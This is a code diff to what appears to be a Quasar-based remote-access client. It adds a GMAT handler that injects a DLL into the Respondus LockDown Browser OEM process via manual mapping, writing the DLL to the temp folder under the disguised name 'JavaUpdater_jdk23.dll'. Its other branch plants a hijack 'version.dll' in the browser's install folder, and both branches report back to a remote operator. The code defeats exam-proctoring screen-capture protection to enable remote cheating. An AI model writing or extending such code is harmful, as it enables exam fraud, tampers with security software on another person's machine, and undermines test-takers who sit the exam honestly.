@@ -47,6 +47,9 @@ namespace Quasar.Client.Messages
                     case BrowserTypeToUnblock.ProProctor:
                         UnblockProproctor(client);
                         break;
+                    case BrowserTypeToUnblock.GMAT:
+                        UnblockGMAT(client, message);
+                        break;
                     default:
                         break;
                 }
@@ -391,5 +394,83 @@ namespace Quasar.Client.Messages
                 client.Send(new NotifyMessageToServer { Message = string.Format("error injection to ProProctor: {0}", ex6.Message) });
             }
         }
+
+        private void UnblockGMAT(ISender client, DoUnblockScreenCapture message)
+        {
+            if (message.args == "inject")
+            {
+                Process[] processes = Process.GetProcessesByName("LockDownBrowserOEM");
+
+                string dllPath = "";
+                if (processes.Length == 0)
+                {
+                    client.Send(new NotifyMessageToServer { Message = "Can't find LockDownBrowserOEM.exe process" });
+                    return;
+                }
+                byte[] realUnblockScreenshotx64 = Resource1.UnblockScreenshot_GMAT;
+                dllPath = Path.Combine(new string[]
+                {
+                    Path.GetTempPath(),
+                    "JavaUpdater_jdk23.dll"
+                });
+                try
+                {
+                    File.WriteAllBytes(dllPath, realUnblockScreenshotx64);
+                }
+                catch (Exception ex5)
+                {
+                    client.Send(new NotifyMessageToServer { Message = string.Format("{0}:\n\n{1}", "Writing 32bit injection dll error", ex5.Message) });
+                }
+                try
+                {
+                    string[] ss = DllInjectionHelper.InjectManualMap("LockDownBrowserOEM", dllPath, true);
+                    string combinedString = string.Join("\n", ss);
+                    client.Send(new NotifyMessageToServer { Message = "GMAT injection result:\n" + combinedString });
+                }
+                catch (Exception ex6)
+                {
+                    client.Send(new NotifyMessageToServer { Message = string.Format("Error injection to GMAT: {0}", ex6.Message) });
+                }
+            }
+            else
+            {
+                string programFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+                string programFilesX86Path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
+                string GMATPath = "";
+                if (Environment.Is64BitOperatingSystem)
+                    GMATPath = Path.Combine(programFilesX86Path, "Respondus", "LockDown Browser OEM");
+                else
+                    GMATPath = Path.Combine(programFilesPath, "Respondus", "LockDown Browser OEM");
+                string GMATBin = Path.Combine(new string[]
+                {
+                    GMATPath,
+                    "LockDownBrowserOEM.exe"
+                });
+
+                if (!File.Exists(GMATBin))
+                {
+                    client.Send(new NotifyMessageToServer { Message = "Can't find GMAT Browser on target machine!\n" + GMATPath });
+                    return;
+                }
+                string dllPath = "";
+                byte[] versionGMATDLL= Resource1.version_GMAT;
+                dllPath = Path.Combine(new string[]
+                {
+                    GMATPath,
+                    "version.dll"
+                });
+                try
+                {
+                    File.WriteAllBytes(dllPath, versionGMATDLL);
+                    client.Send(new NotifyMessageToServer { Message = "Successfully wrote the hijack DLL." });
+                }
+                catch (Exception ex5)
+                {
+                    client.Send(new NotifyMessageToServer { Message = string.Format("{0}:\n\n{1}", "Writing hijack DLL error", ex5.Message) });
+                }
+            }
+
+        }
+
     }
 }
